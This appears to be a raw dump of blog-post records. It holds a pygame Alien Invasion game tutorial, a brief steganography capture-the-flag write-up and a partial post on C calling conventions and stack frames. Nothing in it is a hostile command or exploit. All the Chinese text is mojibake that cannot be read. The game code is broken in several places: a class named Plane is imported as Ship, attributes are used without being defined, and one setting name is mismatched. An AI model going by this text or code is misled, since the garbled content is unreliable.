#å­å¼¹é€Ÿåº¦        self.bullet_width = 3            \t      #å­å¼¹å®½åº¦        self.bullet_height = 15           \t      #å­å¼¹é•¿åº¦        self.bullet_color = (60,60,60)        #å­å¼¹é¢œè‰²        self.bullet_allowed = 5           \t     #å­å¼¹æ•°é‡        self.alien_speed = 1.0            \t     #å¤–æ˜Ÿäººç§»åŠ¨é€Ÿåº¦        self.fleet_drop_speed = 10           #å¤–æ˜Ÿäººè®¾ç½®        self.fleet_direction = 1          \t     #1æ˜¯å³ç§»ï¼Œ-1æ˜¯å·¦ç§»åŠ¨        self.ship_limit = 3                           #è®¾ç½®ç”Ÿå‘½æ¬¡æ•°        self.speedup_scale = 1.1               #æ¸¸æˆè¿è¡Œçš„é€Ÿåº¦        self.score_scale = 1.5                    #æ ¹æ®æ¸¸æˆé€Ÿåº¦æé«˜å¤–æ˜Ÿäººçš„åˆ†æ•°    def initialize_dynamic_settings(self):                              #åˆå§‹åŒ–åœ¨æ•´ä¸ªæ¸¸æˆä¸­æ›´æ”¹çš„è®¾ç½®        self.ship_speed = 1.5                                                         #é£èˆ¹ç§»åŠ¨é€Ÿåº¦        self.bullet_speed = 3.0                                                     #å­å¼¹ç§»åŠ¨é€Ÿåº¦        self.alien_speed = 1.0                                                       #å¤–æ˜Ÿäººç§»åŠ¨é€Ÿåº¦        self.fleet_direction = 1                                                       #å¤–æ˜Ÿäººç§»åŠ¨æ–¹å‘        self.alien_points = 50                                                         #æ¯ä¸ªå¤–æ˜Ÿäººçš„åˆ†æ•°    def increase_speed(self):                                                                       #æé«˜é€Ÿåº¦è®¾ç½®å’Œå¤–æ˜Ÿäººåˆ†æ•°        self.ship_speed *= self.speedup_scale        self.bullet_speed *= self.speedup_scale        self.alien_speed *= self.speedup_scale        self.alien_points = int(self.alien_points * self.score_scale)\n\n\n\nship.py\n\n1234567891011121314151617181920212223import pygameclass Plane:    def __init__(self,ai_game):        # åˆå§‹åŒ–å°é£æœºå¹¶è®¾ç½®å…¶åˆå§‹ä½ç½®        self.screen = ai_game.screen                                                              #åŠ è½½å›¾åƒï¼Œå¹¶è·å¾—å…¶çŸ©å½¢åŒºåŸŸ        self.settings = ai_game.settings                                                         #è¯»å–è®¾ç½®é‡Œé¢çš„ä¿¡æ¯        self.img_plane = pygame.image.load(&quot;images/ship.bmp&quot;)          #åŠ è½½é£èˆ¹ç…§ç‰‡        self.screen_rect = ai_game.screen.get_rect()                              #å¾—åˆ°é£èˆ¹çš„çš„çŸ©å½¢åŒºåŸŸ        self.screen_rect = self.screen.get_rect()                                        #å¾—åˆ°screençš„çŸ©å½¢åŒºåŸŸ        self.rect.midbottom = self.screen_rect.midbottom                      # å°†é£èˆ¹æ”¾åˆ°åº•éƒ¨ä¸­å¤®        self.x = float(self.rect.x)                                                                        #å­˜å‚¨é£æœºçš„ä½ç½®    def blitme(self):        # åœ¨æŒ‡å®šä½ç½®ç»˜åˆ¶å°é£æœº        self.screen.blit(self.image, self.rect)    def update(self):                                                                                                       #æ ¹æ®è¿åŠ¨æ ‡è®°æ›´æ–°é£èˆ¹çš„ä½ç½®        if self.moving_right and self.rect.right &lt; self.screen_rect.right:            #å¦‚æœé£èˆ¹å‘å³ç§»åŠ¨æ²¡æœ‰è¶…è¿‡è¾¹ç•Œï¼Œé£èˆ¹å°±å‘å³ç§»åŠ¨xï¼ˆxå¤§å°æ ¹æ®è®¾ç½®é‡Œé¢çš„é£èˆ¹é€Ÿåº¦ï¼‰            self.x += self.settings.ship_speed        if self.moving_left and self.rect.left &gt; 0:                                                        #å¦‚æœé£èˆ¹å‘å·¦ç§»åŠ¨æ²¡æœ‰è¶…è¿‡è¾¹ç•Œï¼Œé£èˆ¹å°±å‘å·¦ç§»åŠ¨x             self.x -= self.settings.ship_speed             self.rect.x = self.x                                                                                             #æ›´æ–°é£èˆ¹ä½ç½®    def center_ship(self):                                                                                 #å°†é£èˆ¹å±…ä¸­        self.rect.midbottom = self.screen_rect.midbottom                       #å®šä¹‰é£èˆ¹å±…ä¸­ä½ç½®ä¸ºå±å¹•ä¸‹é¢åº•éƒ¨ä¸­å¤®        self.x = float(self.rect.x)                                                                         #æ›´æ–°é£èˆ¹ä½ç½®\n\nbullet.py123456789101112131415161718import pygamefrom pygame.sprite import Spriteclass Bullet(Sprite):    def __init__(self, ai_game):                                                                   #åœ¨èˆ°èˆ¹çš„å½“å‰ä½ç½®åˆ›å»ºä¸€ä¸ªå­å¼¹å¯¹è±¡        super().__init__()                                                                                   #ç»§æ‰¿        self.screen = ai_game.screen        self.settings = ai_game.settings        self.color = self.settings.bullet_color        self.rect = pygame.Rect(0, 0, self.settings.bullet_width,self.settings.bullet_height)              #åˆ›å»ºä¸€ä¸ªå­å¼¹å¹¶æ”¾ç½®åœ¨æ­£ç¡®ä½ç½®        self.rect.midtop = ai_game.ship.rect.midtop        self.y = float(self.rect.y)                                                                          #å­˜å‚¨å­å¼¹çš„ä½ç½®    def update(self):                                                                                            #æ›´æ–°å­å¼¹ä½ç½®        self.y -= self.settings.bullet_speed        self.rect.y = self.y    def draw_bullet(self):                                                                                   #åœ¨å±å¹•ä¸Šç»˜åˆ¶å­å¼¹        pygame.draw.rect(self.screen, self.color, self.rect)\n\ngame_stats.py1234567891011121314class GameStats:    &quot;&quot;&quot;Track statistics for Alien Invasion.&quot;&quot;&quot;        def __init__(self, ai_game):        &quot;&quot;&quot;Initialize statistics.&quot;&quot;&quot;        self.settings = ai_game.settings        self.reset_stats()        self.game_active = False                                           #è‡ªåŠ¨å¼€å¯æ¸¸æˆ        self.high_score = 0\t\t\t\t\t\t       #é«˜åˆ†æ°¸è¿œä¸è¦é‡ç½®ã€‚            def reset_stats(self):\t\t\t\t\t\t    #åˆå§‹åŒ–æ¸¸æˆæ•°æ®        self.ships_left = self.settings.ship_limit        self.score = 0        self.level = 1\n\nscoreboard.py12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import pygame.fontfrom pygame.sprite import Groupfrom ship import Shipclass Scoreboard:    def __init__(self, ai_game):                       #åˆå§‹åŒ–å¾—åˆ†å±æ€§        self.ai_game = ai_game        self.screen = ai_game.screen        self.screen_rect = self.screen.get_rect()        self.settings = ai_game.settings                self.stats = ai_game.stats                                      #å¾—åˆ†ä¿¡æ¯çš„å­—ä½“è®¾ç½®        self.text_color = (30, 30, 30)        self.font = pygame.font.SysFont(None, 48)        self.prep_score()                                                       #åˆå§‹ä¹è°±å›¾åƒ        self.prep_high_score()        self.prep_level()        self.prep_ships()    def prep_score(self):        &quot;&quot;&quot;Turn the score into a rendered image.&quot;&quot;&quot;        rounded_score = round(self.stats.score, -1)        score_str = &quot;&#123;:,&#125;&quot;.format(rounded_score)        self.score_image = self.font.render(score_str, True,                self.text_color, self.settings.bg_color)                self.score_rect = self.score_image.get_rect()               #åœ¨å±å¹•å³ä¸Šæ–¹æ˜¾ç¤ºåˆ†æ•°        self.score_rect.right = self.screen_rect.right - 20        self.score_rect.top = 20    def prep_high_score(self):                                                     #å°†é«˜åˆ†è½¬æ¢ä¸ºå›¾åƒ        high_score = round(self.stats.high_score, -1)        high_score_str = &quot;&#123;:,&#125;&quot;.format(high_score)        self.high_score_image = self.font.render(high_score_str, True,                self.text_color, self.settings.bg_color)                    self.high_score_rect = self.high_score_image.get_rect()          #å°†é«˜åˆ†å±…ä¸­æ˜¾ç¤ºåœ¨å±å¹•é¡¶éƒ¨        self.high_score_rect.centerx = self.screen_rect.centerx        self.high_score_rect.top = self.score_rect.top    def prep_level(self):                                                                      #å°†ç­‰çº§è½¬æ¢ä¸ºæ¸²æŸ“çš„å›¾åƒã€‚        level_str = str(self.stats.level)        self.level_image = self.font.render(level_str, True,                self.text_color, self.settings.bg_color)            self.level_rect = self.level_image.get_rect()                 #å°†çº§åˆ«å®šä½åœ¨åˆ†æ•°ä¸‹æ–¹        self.level_rect.right = self.score_rect.right        self.level_rect.top = self.score_rect.bottom + 10    def prep_ships(self):                                                                 #æ˜¾ç¤ºç”Ÿå‘½å€¼        self.ships = Group()        for ship_number in range(self.stats.ships_left):            ship = Ship(self.ai_game)            ship.rect.x = 10 + ship_number * ship.rect.width            ship.rect.y = 10            self.ships.add(ship)    def check_high_score(self):                                               #æ£€æŸ¥æ˜¯å¦æœ‰æ–°é«˜åˆ†        if self.stats.score &gt; self.stats.high_score:            self.stats.high_score = self.stats.score            self.prep_high_score()    def show_score(self):                                                            #åœ¨å±å¹•ä¸Šé¢ç»˜åˆ¶åˆ†æ•°å’Œå…¶å®ƒä¿¡æ¯        self.screen.blit(self.score_image, self.score_rect)        self.screen.blit(self.high_score_image, self.high_score_rect)        self.screen.blit(self.level_image, self.level_rect)        self.ships.draw(self.screen)\n\nbotto.py123456789101112131415161718192021222324252627import pygame.font class Button:     def __init__(self, ai_game, msg):                 #åˆå§‹åŒ–        self.screen = ai_game.screen        self.screen_rect = self.screen.get_rect()                self.width, self.height = 200, 50               #è®¾ç½®æŒ‰é’®çš„å°ºå¯¸å’Œå±æ€§        self.button_color = (0, 255, 0)        self.text_color = (255, 255, 255)        self.font = pygame.font.SysFont(None, 48)                self.rect = pygame.Rect(0, 0, self.width, self.height)    #æ”¾ç½®playå›¾æ ‡        self.rect.center = self.screen_rect.center                self._prep_msg(msg)                                  #è¯¥æŒ‰é’®ä»…éœ€å‡†å¤‡ä¸€æ¬¡    def _prep_msg(self, msg):                              #å°†å…¶è½¬æ¢ä¸ºæ¸²æŸ“çš„å›¾åƒï¼Œç„¶ååœ¨æŒ‰é’®ä¸Šå±…ä¸­æ˜¾ç¤ºæ–‡æœ¬ã€‚        self.msg_image = self.font.render(msg, True, self.text_color,                self.button_color)        self.msg_image_rect = self.msg_image.get_rect()        self.msg_image_rect.center = self.rect.center    def draw_button(self):                                     #åœ¨å±å¹•ä¸Šé¢ç»˜åˆ¶        self.screen.fill(self.button_color, self.rect)        self.screen.blit(self.msg_image, self.msg_image_rect)\n\né‡æ„alien_invasion.py123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252import sysfrom time import sleepimport pygamefrom settings import Settingsfrom game_stats import GameStatsfrom scoreboard import Scoreboardfrom button import Buttonfrom ship import Shipfrom bullet import Bulletfrom alien import Alien&quot;&quot;&quot;ç®¡ç†æ¸¸æˆèµ„æºå’Œè¡Œä¸ºçš„ç±»&quot;&quot;&quot;class AlienInvasion:    def __init__(self):        &quot;&quot;&quot;åˆå§‹åŒ–æ¸¸æˆå¹¶åˆ›å»ºæ¸¸æˆèµ„æº&quot;&quot;&quot;        pygame.init()        self.settings = Settings()        self.screen = pygame.display.set_mode((0, 0), pygame.FULLSCREEN)        self.settings.screen_width = self.screen.get_rect().width        self.settings.screen_height = self.screen.get_rect().height        pygame.display.set_caption(&quot;Alien Invasion&quot;)        &quot;&quot;&quot;åˆ›å»ºä¸€ä¸ªå®ä¾‹æ¥å­˜å‚¨æ¸¸æˆç»Ÿè®¡ä¿¡æ¯ï¼Œå¹¶åˆ›å»ºä¸€ä¸ªè®°åˆ†æ¿ã€‚&quot;&quot;&quot;        self.stats = GameStats(self)        self.sb = Scoreboard(self)        self.ship = Ship(self)        self.bullets = pygame.sprite.Group()        self.aliens = pygame.sprite.Group()        self._create_fleet()        &quot;&quot;&quot;è®¾ç½®play&quot;&quot;&quot;        self.play_button = Button(self, &quot;Play&quot;)    &quot;&quot;&quot;å¼€å¯æ¸¸æˆå¹¶å¾ªç¯&quot;&quot;&quot;    def run_game(self):        while True:            self._check_events()            if self.stats.game_active:                self.ship.update()                self._update_bullets()                self._update_aliens()            self._update_screen()    &quot;&quot;&quot;å“åº”æŒ‰é”®å’Œé¼ æ ‡äº‹ä»¶&quot;&quot;&quot;    def _check_events(self):        for event in pygame.event.get():            if event.type == pygame.QUIT:                sys.exit()            elif event.type == pygame.KEYDOWN:                self._check_keydown_events(event)            elif event.type == pygame.KEYUP:                self._check_keyup_events(event)            elif event.type == pygame.MOUSEBUTTONDOWN:                mouse_pos = pygame.mouse.get_pos()                self._check_play_button(mouse_pos)    &quot;&quot;&quot;å½“ç©å®¶å•å‡»æ’­æ”¾æ—¶å¼€å§‹æ–°æ¸¸æˆ&quot;&quot;&quot;    def _check_play_button(self, mouse_pos):        &quot;&quot;&quot;Start a new game when the player clicks Play.&quot;&quot;&quot;        button_clicked = self.play_button.rect.collidepoint(mouse_pos)        if button_clicked and not self.stats.game_active:            #é‡ç½®æ¸¸æˆè®¾ç½®            self.settings.initialize_dynamic_settings()            #é‡ç½®æ¸¸æˆç»Ÿè®¡ä¿¡æ¯            self.stats.reset_stats()            self.stats.game_active = True            self.sb.prep_score()            self.sb.prep_level()            self.sb.prep_ships()            #æ‘†è„±ä»»ä½•å‰©ä½™çš„å¤–æ˜Ÿäººå’Œå­å¼¹            self.aliens.empty()            self.bullets.empty()                        #å»ºç«‹ä¸€ä¸ªæ–°çš„èˆ°é˜Ÿå¹¶é›†ä¸­èˆ°èˆ¹            self._create_fleet()            self.ship.center_ship()            #éšè—é¼ æ ‡å…‰æ ‡            pygame.mouse.set_visible(False)    &quot;&quot;&quot;å“åº”æŒ‰é”®&quot;&quot;&quot;    def _check_keydown_events(self, event):        if event.key == pygame.K_RIGHT:            self.ship.moving_right = True        elif event.key == pygame.K_LEFT:            self.ship.moving_left = True        elif event.key == pygame.K_q:            sys.exit()        elif event.key == pygame.K_SPACE:            self._fire_bullet()        &quot;&quot;&quot;é‡Šæ”¾æŒ‰é”®&quot;&quot;&quot;    def _check_keyup_events(self, event):        if event.key == pygame.K_RIGHT:            self.ship.moving_right = False        elif event.key == pygame.K_LEFT:            self.ship.moving_left = False    &quot;&quot;&quot;åˆ›å»ºä¸€ä¸ªæ–°çš„é¡¹ç›®ç¬¦å·å¹¶å°†å…¶æ·»åŠ åˆ°é¡¹ç›®ç¬¦å·ç»„&quot;&quot;&quot;    def _fire_bullet(self):        if len(self.bullets) &lt; self.settings.bullets_allowed:            new_bullet = Bullet(self)            self.bullets.add(new_bullet)    &quot;&quot;&quot;æ›´æ–°é¡¹ç›®ç¬¦å·çš„ä½ç½®å¹¶æ‘†è„±æ—§é¡¹ç›®ç¬¦å·&quot;&quot;&quot;    def _update_bullets(self):        # æ›´æ–°å­å¼¹ä½ç½®        self.bullets.update()        # æ¶ˆé™¤å­å¼¹        for bullet in self.bullets.copy():            if bullet.rect.bottom &lt;= 0:                 self.bullets.remove(bullet)        self._check_bullet_alien_collisions()    &quot;&quot;&quot;å­å¼¹ä¸å¤–æ˜Ÿäººçš„ç¢°æ’&quot;&quot;&quot;    def _check_bullet_alien_collisions(self):        # æ¶ˆé™¤è¢«æ‰“åˆ°çš„å­å¼¹å’Œå¤–æ˜Ÿäºº        collisions = pygame.sprite.groupcollide(                self.bullets, self.aliens, True, True)        if collisions:            for aliens in collisions.values():                self.stats.score += self.settings.alien_points * len(aliens)            self.sb.prep_score()            self.sb.check_high_score()        if not self.aliens:            # é”€æ¯ç°æœ‰å­å¼¹å¹¶å»ºç«‹æ–°çš„èˆ°é˜Ÿ            self.bullets.empty()            self._create_fleet()            self.settings.increase_speed()            # Increase level.            self.stats.level += 1            self.sb.prep_level()    &quot;&quot;&quot;æ£€æŸ¥èˆ°é˜Ÿæ˜¯å¦å¤„äºè¾¹ç¼˜ï¼Œç„¶åæ›´æ–°èˆ°é˜Ÿä¸­æ‰€æœ‰å¤–æ˜Ÿäººçš„ä½ç½®ã€‚&quot;&quot;&quot;    def _update_aliens(self):        self._check_fleet_edges()        self.aliens.update()        # å¯»æ‰¾ä¸å¤–æ˜Ÿäººçš„ç¢°æ’        if pygame.sprite.spritecollideany(self.ship, self.aliens):            self._ship_hit()        # å¯»æ‰¾å¤–æ˜Ÿäººæ’åˆ°å±å¹•åº•éƒ¨        self._check_aliens_bottom()    &quot;&quot;&quot;æ£€æŸ¥æ˜¯å¦æœ‰ä»»ä½•å¤–æ˜Ÿäººåˆ°è¾¾å±å¹•åº•éƒ¨&quot;&quot;&quot;    def _check_aliens_bottom(self):        screen_rect = self.screen.get_rect()        for alien in self.aliens.sprites():            if alien.rect.bottom &gt;= screen_rect.bottom:                # Treat this the same as if the ship got hit.                self._ship_hit()                break    &quot;&quot;&quot;è¢«å¤–æ˜Ÿäººå‡»ä¸­&quot;&quot;&quot;    def _ship_hit(self):        if self.stats.ships_left &gt; 0:            # å‡å°‘ç”Ÿå‘½ï¼Œå¹¶æ›´æ–°è®°åˆ†æ¿.            self.stats.ships_left -= 1            self.sb.prep_ships()                        # æ‘†è„±ä»»ä½•å‰©ä½™çš„å¤–æ˜Ÿäººå’Œå­å¼¹.            self.aliens.empty()            self.bullets.empty()                        # å»ºç«‹ä¸€ä¸ªæ–°çš„èˆ°é˜Ÿå¹¶é›†ä¸­èˆ°èˆ¹.            self._create_fleet()            self.ship.center_ship()                        # æš‚åœ            sleep(0.5)        else:            self.stats.game_active = False            pygame.mouse.set_visible(True)    &quot;&quot;&quot;å»ºç«‹å¤–æ˜Ÿäººçš„èˆ°é˜Ÿ&quot;&quot;&quot;    def _create_fleet(self):        # åˆ›å»ºä¸€ä¸ªå¤–æ˜Ÿäººå¹¶è¿ç»­æŸ¥æ‰¾å¤–æ˜Ÿäººçš„æ•°é‡ã€‚        # æ¯ä¸ªå¤–æ˜Ÿäººä¹‹é—´çš„é—´è·ç­‰äºä¸€ä¸ªå¤–æ˜Ÿäººçš„å®½åº¦ã€‚        alien = Alien(self)        alien_width, alien_height = alien.rect.size        available_space_x = self.settings.screen_width - (2 * alien_width)        number_aliens_x = available_space_x // (2 * alien_width)                # ç¡®å®šé€‚åˆå±å¹•çš„å¤–æ˜Ÿäººè¡Œæ•°        ship_height = self.ship.rect.height        available_space_y = (self.settings.screen_height -                                (3 * alien_height) - ship_height)        number_rows = available_space_y // (2 * alien_height)                # å»ºç«‹å®Œæ•´çš„å¤–æ˜Ÿäººèˆ°é˜Ÿ.        for row_number in range(number_rows):            for alien_number in range(number_aliens_x):                self._create_alien(alien_number, row_number)    &quot;&quot;&quot;åˆ›å»ºå¤–æ˜Ÿäººå¹¶å°†å…¶æ”¾ç½®åœ¨è¡Œä¸­&quot;&quot;&quot;    def _create_alien(self, alien_number, row_number):        alien = Alien(self)        alien_width, alien_height = alien.rect.size        alien.x = alien_width + 2 * alien_width * alien_number        alien.rect.x = alien.x        alien.rect.y = alien.rect.height + 2 * alien.rect.height * row_number        self.aliens.add(alien)    &quot;&quot;&quot;å¦‚æœæœ‰ä»»ä½•å¤–æ˜Ÿäººåˆ°è¾¾è¾¹ç¼˜ï¼Œè¯·åšå‡ºé€‚å½“çš„ååº”&quot;&quot;&quot;    def _check_fleet_edges(self):        for alien in self.aliens.sprites():            if alien.check_edges():                self._change_fleet_direction()                break                def _change_fleet_direction(self):        &quot;&quot;&quot;æ”¾ä¸‹æ•´ä¸ªèˆ°é˜Ÿå¹¶æ›´æ”¹èˆ°é˜Ÿçš„æ–¹å‘.&quot;&quot;&quot;        for alien in self.aliens.sprites():            alien.rect.y += self.settings.fleet_drop_speed        self.settings.fleet_direction *= -1    &quot;&quot;&quot;æ›´æ–°å±å¹•ä¸Šçš„å›¾åƒï¼Œç„¶ååˆ‡æ¢åˆ°æ–°å±å¹•&quot;&quot;&quot;    def _update_screen(self):        &quot;&quot;&quot;Update images on the screen, and flip to the new screen.&quot;&quot;&quot;        self.screen.fill(self.settings.bg_color)        self.ship.blitme()        for bullet in self.bullets.sprites():            bullet.draw_bullet()        self.aliens.draw(self.screen)        # ç»˜åˆ¶åˆ†æ•°ä¿¡æ¯.        self.sb.show_score()        #å¦‚æœæ¸¸æˆå¤„äºéæ´»åŠ¨çŠ¶æ€ï¼Œè¯·ç»˜åˆ¶æ’­æ”¾æŒ‰é’®.        if not self.stats.game_active:            self.play_button.draw_button()        pygame.display.flip()if __name__ == &#x27;__main__&#x27;:    # è¿è¡Œæ¸¸æˆ    ai = AlienInvasion()    ai.run_game()\n\næ€»ç»“åœ¨è®¾è®¡æ—¶æ˜¯éœ€è¦ä¸æ–­å¯¹æ¯ä¸ªæ¨¡å—è¿›è¡Œé‡æ„ï¼Œé‡æ„çš„ç›®çš„ä¸€æ˜¯ä¸ºäº†ä½¿ä»£ç çœ‹èµ·æ¥æ›´ç®€æ´ï¼Œè€Œæ˜¯ä¼˜åŒ–ä»£ç ï¼Œå‡å°‘ä¸å¿…è¦çš„ä»£ç ã€‚é™¤æ­¤ä¹‹å¤–ï¼Œè¿˜éœ€è¦å¯¹é¡¹ç›®è¿›è¡Œä¸æ–­æ£€æŸ¥ï¼Œæ£€æŸ¥æ˜¯å¦æœ‰bugï¼Œå¯¹bugè¦è¿›è¡Œå³ä½¿ä¿®æ”¹ã€‚è¿˜æœ‰ï¼Œpythonè™½ç„¶ä½¿ç”¨èµ·æ¥éå¸¸æ–¹ä¾¿ï¼Œä½†æ˜¯éœ€è¦è®°ä½çš„å‡½æ•°å´å¾ˆå¤šï¼Œè¦ç†Ÿç»ƒçš„ä½¿ç”¨ï¼Œå¿…é¡»è¦èƒ½å¤Ÿç†Ÿæ‚‰ç›¸å…³çš„ç¬¬ä¸‰æ–¹åº“ï¼Œè¿™æ ·æ‰èƒ½åšåˆ°æ¸¸åˆƒæœ‰ä½™ã€‚\n","slug":"pygameä½¿ç”¨","date":"2021-05-12T12:25:39.000Z","categories_index":"å¿ƒå¾—","tags_index":"python","author_index":"Krito"},{"id":"1521d5bfeaaa79eb316ce7916671f885","title":"è“å¸½æ¯MISC","content":"å†°å¢©å¢©æ‹¿åˆ°é™„ä»¶æ‹–è¿›è™šæ‹Ÿæœºä¸­ä½¿ç”¨binwalkæŸ¥çœ‹\n\nå‘ç°é‡Œé¢å­˜åœ¨rarå‹ç¼©åŒ…ï¼Œä½¿ç”¨foremostè¿›è¡Œåˆ†ç¦»\n\n\nå‘ç°éŸ³é¢‘å’Œæç¤º\nå°†éŸ³é¢‘æ”¾è¿›010ï¼Œåœ¨ç»“å°¾å‘ç°cipher\nå°†å¯¹åº”çš„åå…­è¿›åˆ¶ç å¤åˆ¶ä¸‹æ¥ï¼Œæœç´¢ä»¥0~Fç¼–ç çš„åŠ å¯†æ–¹å¼ï¼Œå‘ç°æ˜¯urlç¼–ç ã€‚\nå¯¹åå…­è¿›åˆ¶ç è¿›è¡Œå¤„ç†\nè§£ç åå‘ç°æ˜¯ä¸€å †è¡¨æƒ…åŒ…\nå¯¹è¡¨æƒ…åŒ…è¿›è¡Œè§£ç å‘ç°æ— æ³•ç¿»è¯‘ï¼Œæœç´¢äº†ä¸€ä¸‹å‘ç°å¯èƒ½æ˜¯emoji-aesåŠ å¯†ï¼Œä½†ç¼ºå°‘å¯†åŒ™ï¼Œä¹‹åå›å»åœ¨çœ‹mp3æ–‡ä»¶ï¼Œæƒ³åˆ°miscé‡Œé¢æœ‰ä¸€ä¸ªMP3stegoçš„å·¥å…·ï¼Œä½†æ˜¯è¿˜éœ€è¦ä¸€ä¸ªå¯†ç æ‰æœ‰è¡Œï¼Œæƒ³åˆ°ä¹‹å‰çš„eight numbersï¼ŒåŠ ä¸Šé¢˜ç›®åç§°ï¼ŒçŒœæµ‹å¯èƒ½æ˜¯å†¬å¥¥ä¼šä¸¾åŠæ—¥æœŸ20220204\nå¾—åˆ°ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œå‘ç°æ˜¯pythoné‡Œé¢çš„ä¸€ç§ç¼–ç æ–¹å¼\nå‘ç°æ˜¯wingdingså›¾æ ‡ï¼Œåœ¨çº¿è§£ç ï¼Œå¾—åˆ°å¯†åŒ™How_6ad_c0uld_a_1cePeak_be?   ä¹‹åè¿›è¡Œemoji-aesè§£ç å¾—åˆ°flag\n","slug":"è“å¸½æ¯MISC","date":"2021-05-04T02:34:09.000Z","categories_index":"MISC","tags_index":"write up","author_index":"Krito"},{"id":"20bf7105b3d9595b11047eca410abfeb","title":"Cè¯­è¨€å‡½æ•°è°ƒç”¨ä¸å¸¸è§è°ƒç”¨çº¦å®š","content":"å‡½æ•°è°ƒç”¨ä¸‹é¢ä»£ç å±•ç¤ºäº†ä¸€ä¸ªç®€å•çš„åŠ æ³•å­å‡½æ•°è°ƒç”¨\n12345678910#include&lt;stdio.h&gt;int plus (int a,int b)&#123;    return a+b;&#125;void main()&#123;    int a=1,b=2,c;    c=plus(a,b);&#125;\n\nè¿›å…¥åæ±‡ç¼–æŸ¥çœ‹\n\né¦–å…ˆï¼Œç³»ç»Ÿä¼šå°†1ï¼Œ2åˆ†åˆ«ç§»åŠ¨åˆ°aï¼Œbå¯¹åº”çš„åœ°å€ä¸­ï¼Œä¹‹åä»å³è‡³å·¦å°†bï¼Œaå¯¹åº”åœ°å€çš„å€¼ç§»åŠ¨åˆ°eaxï¼Œecxä¸­ï¼Œä¹‹åè¿›è¡Œè·³è½¬åˆ°pluså‡½æ•°çš„pltè¡¨\n\nå†è·³è½¬åˆ°pluså‡½æ•°çš„å®é™…ä¸­\n\nå­å‡½æ•°å…ˆæ˜¯æŠŠebpä¿å­˜åœ¨æ ˆä¸­ï¼Œä¹‹åé€šè¿‡movæŒ‡ä»¤å°†ebpæŒ‡å‘espæŒ‡å‘çš„ä½ç½®ï¼Œespå†è¿›è¡ŒæŠ¬æ ˆå¤„ç†ï¼Œç„¶åä¿å­˜ç°åœºï¼ˆå°†ebxï¼Œesiï¼Œediå­˜å‚¨çš„å€¼ä¿å­˜åœ¨å †æ ˆä¸­ï¼‰,æ¥ä¸‹æ¥æŠŠebp-0chå¯¹åº”çš„åœ°å€ç§»åŠ¨åˆ°ediä¸­ã€‚ä¹‹åå‘ecxèµ‹30hï¼Œå‘eaxèµ‹0CCCCCCCChï¼Œç„¶åå¯¹es:ediå¯¹åº”çš„åœ°å€å¼€å§‹å¾ªç¯èµ‹å€¼ï¼ˆæ•´ä¸ªè¿‡ç¨‹å°±æ˜¯å¯¹ç¼“å†²åŒºåˆå§‹åŒ–ï¼‰ã€‚ï¼ˆåé¢ä¸¤ä¸ªä¸çŸ¥é“æ˜¯ä»€ä¹ˆï¼Œå¤ªèœäº†ğŸ˜…ï¼‰\nè¡¥ï¼šç¼“å†²åŒºç”¨äºå­˜å‚¨å‡½æ•°è°ƒç”¨é‡Œé¢ç”³è¯·çš„å˜é‡ï¼Œå› ä¸ºè¿™äº›å˜é‡å­˜æ”¾åœ¨ç¼“å†²åŒºï¼Œå½“è°ƒç”¨å®Œæˆåç¼“å†²åŒºä¼šè¢«ä¸¢å¼ƒï¼Œæ‰€ä»¥å‡½æ•°è°ƒç”¨é‡Œé¢çš„å˜é‡æ— æ³•è¢«å‡½æ•°å¤–é¢è®¿é—®åˆ°\n\næ¥ä¸‹æ¥å°±æ˜¯å°†açš„å€¼ç§»åŠ¨åˆ°eaxä¸­å†åŠ bçš„å€¼ï¼Œåé¢å†æ¢å¤ç°åœºï¼Œå†å†…å¹³æ ˆï¼ˆadd esp 0C0hï¼‰,ä¹‹åæ¯”è¾ƒespï¼Œebpæ˜¯å¦ç›¸åŒï¼Œï¼ˆå¦‚æœç›¸åŒæˆ‘ä¹Ÿä¸çŸ¥é“ä¼šæ€ä¹ˆæ ·ï¼ŒğŸ˜…ï¼‰ï¼Œç„¶åå°†espæŒ‡å‘ebpæŒ‡å‘çš„ä½ç½®ï¼Œå°†ebpè¿”å›åˆ°åŸæ¥çš„åœ°æ–¹ã€‚\n\næœ€åå¤–å¹³æ ˆï¼ˆadd esp,8ï¼‰ï¼Œå°†è®¡ç®—ç»“æœä»eaxç§»åˆ°å˜é‡cå¯¹åº”çš„åœ°å€ä¸­ï¼Œè‡³æ­¤å®Œæˆå‡½æ•°è°ƒç”¨\n\nå¸¸è§çš„ä¸‰ç§è°ƒç”¨çº¦å®šï¼ˆ32ä½ï¼‰\nç¬¬ä¸€ç§å°±æ˜¯ç³»ç»Ÿé»˜è®¤çš„è°ƒç”¨çº¦å®šï¼Œè°ƒç”¨è€…æ¸…ç†æ ˆï¼Œå°±æ˜¯å’Œä¸Šé¢å¤–å¹³æ ˆï¼ˆadd esp,8ï¼‰å·®ä¸å¤š\nç¬¬äºŒç§å°±æ˜¯åœ¨è¿”å›æ—¶å¯¹retè¿›è¡Œå¤„ç†ï¼Œä½¿æ ˆæŒ‡é’ˆæŒ‡å‘è°ƒç”¨å‚æ•°å‰çš„åœ°å€ï¼ˆå¦‚ï¼šret 8ï¼‰\nç¬¬ä¸‰ç§å°±æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ å‚ï¼Œä½†å¦‚æœå¯„å­˜å™¨ä¸å¤Ÿè¿˜æ˜¯å¾—å€ŸåŠ©æ ˆæ¥ä¼ å‚ï¼Œå› ä¸ºcpuä¸å¯„å­˜å™¨ä¹‹é—´ä¼ é€’ç›¸å¯¹äºcpuä¸å†…å­˜æ›´å¿«ï¼Œæ‰€ä»¥ç¬¬ä¸‰ç§æ–¹æ³•åœ¨å‚æ•°è¾ƒå°‘æ—¶ï¼Œæ›´åŠ 